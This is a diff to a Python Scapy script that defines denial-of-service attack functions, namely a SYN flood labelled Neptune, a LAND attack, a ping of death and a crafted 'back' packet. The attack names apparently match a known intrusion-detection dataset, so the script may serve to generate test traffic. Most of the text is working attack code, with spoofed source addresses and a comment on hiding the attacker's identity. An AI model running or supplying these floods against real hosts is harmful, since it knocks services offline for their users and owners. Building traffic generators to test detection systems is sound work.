@@ -10,7 +10,9 @@ from scapy.all import *
 # Can just try the HTTP LIB to use this for us?
 def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
     # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
-    back_attack = IP(src=src_ip, dst=target_ip, ttl=10) / TCP(flags="S", sport=RandShort() / Raw(payload=payload), dport=int(target_port), timeout=2)
+    i = IP(src=src_ip, dst=target_ip)
+    t = TCP(flags="S", dport=int(target_port), sport=RandShort(), timeout=2)
+    back_attack = i / t / Raw(payload=payload)
     replies = sr(back_attack)
     for packet in replies:
         print(packet)
@@ -18,11 +20,11 @@ def back(target_ip, payload, src_ip="192.168.147.150", target_port=80):
 
 # SYN flood denial of service on one or more ports - Neptune
 # You can use the id and ttl fields to help hide the identity of the attacker
-def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=1000000):
+def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=1000):
     count = 0
     while count < packets_send:
         # Creates the packet and assigns it to variable a
-        a = IP(id=1111, src=src_ip, dst=target_ip, ttl=20)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
+        a = IP(src=src_ip, dst=target_ip)/TCP(flags="S", sport=RandShort(), dport=int(target_port))
         send(a)  # Sends the Packet
         count = count + 1
         # print(str(count) + " Packets Sent")
@@ -35,10 +37,10 @@ def syn_flood(target_ip, target_port, src_ip="192.168.147.151", packets_send=100
 
 # Denial of service where a remote host is sent a UDP packet with the
 # same source and destination
-def land(target_ip, target_port, src="192.168.147.150", packets_send=10000):
+def land(target_ip, target_port, src="192.168.147.150", packets_send=1000):
     count = 0
     while count < packets_send:
-        send(IP(src=target_ip, dst=target_ip, ttl=30) / UDP(sport=target_port, dport=target_port))
+        send(IP(src=target_ip, dst=target_ip) / UDP(sport=target_port, dport=target_port))
         count = count + 1
     print("Land attack complete!")
 
@@ -47,7 +49,8 @@ def land(target_ip, target_port, src="192.168.147.150", packets_send=10000):
 # Send a malicious ping to another computer that exceeds that maximum IPv4
 # packet size which is 65,535 bytes
 def pod(target_ip, src_ip="192.168.147.152"):
-    send(fragment(IP(src=src_ip,dst=target_ip, ttl=40/ICMP()/('X' * 60000))))
+    i = IP(src=src_ip, dst=target_ip)
+    send(fragment(i/ICMP()/(str('X' * 60000))))
 
 
 # Denial of service icmp echo reply flood
